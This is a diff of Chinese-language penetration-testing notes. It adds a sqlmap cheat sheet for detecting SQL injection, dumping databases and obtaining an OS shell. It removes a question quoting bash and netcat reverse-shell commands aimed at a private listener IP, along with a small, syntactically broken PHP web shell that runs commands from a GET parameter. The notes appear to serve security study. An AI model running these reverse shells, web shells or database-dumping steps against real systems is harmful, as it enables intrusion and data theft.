@@ -242,39 +242,74 @@ run
 sessions -i
 ```
 
-
-
-
-
-
-
-
+## sqlmap
 
 ```bash
-为什么我给a赋值bash -i >& /dev/tcp/192.168.6.149/6666 0>&1时，不会建立反向连接。但是我给a赋值nc 192.168.6.149 5555 -e /bin/bash在kali上获取到www-data的shell后，在www-data的shell中运行这个命令却可以建立一个反向连接。我看thejabasshell.php文件中也没有额外的代码防护。
+#1、基本参数
+-u'':url，默认GET
+-r'':读文件，默认POST
+--data=:post方式扫描（需要复制全部post表单内容）
+-p'':指定要扫描的参数
+-f:指纹判别数据库类型
+-b:获取数据库版本信息
+*:加在参数后（id=1*），优先扫描
+-D'',-T'',-C''，-U'':指定库，表，列，用户
+--current-db,--current-user:获取当前数据库名，当前用户名
+--dbs,--tables,--column，--dump，--users，--passwords,--privileges:获取指定（不指定就是所有）数据库名、表名、列名，数据，用户，密码,权限（--column和--dump在不指定时都只能获取当前数据库所有列名和数据）
+--batch:默认配置
+--level=:1-5级，要执行的测试水平等级，默认为1。检测级别大于等于2时会检测 cookie 是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入
+--risk=:0-3级，测试执行的风险等级，默认为1，探测等级一个意思，在不确定的情况下，建议设置为3级
 
-相应的端口都是处于监听状态的，即5555和6666都监听了。我本来以为是www-data权限问题无法访问/dev，但是获取到www-data的shell后却可以在建立一个反向连接，
+--cookie=:自定义http该字段
+###注意：在进行Cookie注入测试时，重定向的不行，必须是带cookie字段的http报文才可以（他不能重定向以后再自己测试）
+--referer=:自定义http该字段
+--user-agent=:自定义http该字段
+--purge:清除缓存
+--dump-all：获取数据库全部数据（慢）
+--shell-os:获取靶机shell
+--
+
+-v  #详细的等级(0-6) 
+    0：只显示Python的回溯，错误和关键消息。 
+    1：显示信息和警告消息。 
+    2：显示调试消息。 
+    3：有效载荷注入。 
+    4：显示HTTP请求。 
+    5：显示HTTP响应头。 
+    6：显示HTTP响应页面的内容
+
+
+
+
+
+-u:扫描某url(GET方式)
+
+-r:扫描某以POST方式提交的http请求（-r目标为.txt文件，POST方式）
+
+-p:指定POST方式下扫描的注入表单参数
+
+-D:已知的库名
+
+--dbs:给出所有数据库
+
+--current-db：给出当前所在数据库
+
+-T:已知的表名
+
+--tables：给出所有表名
+
+-C:已知的列名
+
+--colums：给出所有列名
+
+--dump:加载所有当前列的数据 //尽量不用，会下载数据
+
+-m txt.txt批量扫描url（不加-u）
+
+总体上以上的用法即先看有没有注入点，然后--dbs爆数据，--current-db爆当前数据库，-D xxx --tables爆表，-D xxx -T xxx --colums爆列，-D xxx -T xxx --C xxx,xxx,xxx --dump爆具体数据。
 ```
 
-![image-20240621152546677](ToolsHub.assets/image-20240621152546677.png)
-
-![image-20240621152610218](ToolsHub.assets/image-20240621152610218.png)
-
-![image-20240621152125187](ToolsHub.assets/image-20240621152125187.png)
-
-![image-20240621152106313](ToolsHub.assets/image-20240621152106313.png)
 
 
 
-```php
-<?php
-if(isset($_GET('a'))){
-    if($_GET('b') = 'pass'){
-        system($_GET('a'));
-    } else{
-        echo 'error';
-    }
-}
-?>
-```
 
